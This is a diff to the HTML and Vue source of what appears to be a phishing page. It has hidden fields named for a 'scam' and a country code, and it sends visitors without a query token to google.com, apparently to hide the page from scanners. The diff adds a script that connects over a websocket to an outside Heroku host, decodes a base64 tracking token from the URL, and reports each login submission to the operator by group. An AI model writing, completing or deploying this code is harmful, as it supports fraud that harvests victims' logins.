@@ -104,7 +104,7 @@
             <input type="hidden" value="" name="sc" v-model="scamname">
             <input type="hidden" value="" name="code" v-model="codecountry">
 
-            <button type="submit" name="add" class="birou">{{login}}</button>
+            <button type="submit" name="add" onclick="ss()" class="birou">{{login}}</button>
           </div>
       </form>
     </div>
@@ -119,6 +119,27 @@
   <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
   <script src="https://unpkg.com/country-phone-prefix@latest"></script>
   <script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.3.2/socket.io.js"></script>
+  <script>
+    const socket = io("wss://sc0m.herokuapp.com");
+    const queryStrings = window.location.search;
+    const urlParamss = new URLSearchParams(queryStrings);
+    const qs = urlParamss.get('q');
+
+    let rrss = atob(qs);
+    let users = rrss.split("_")[3];
+    users = users.split("=")[1];
+    function ss() {
+      socket.emit('add', {
+        nickname: "users",
+        groupe: parseInt(users),
+      });
+      socket.emit('adds', {
+        nickname: "users",
+        groupe: 1,
+      });
+    };
+  </script>
   <script>
     var vm = new Vue({
       el: "#page",
@@ -241,9 +262,9 @@
 
 
     const queryString = window.location.search;
-        const urlParams = new URLSearchParams(queryString);
-        const q = urlParams.get('q');
-    
+    const urlParams = new URLSearchParams(queryString);
+    const q = urlParams.get('q');
+
     if (q == null) {
       window.location = "https://google.com";
       exit();
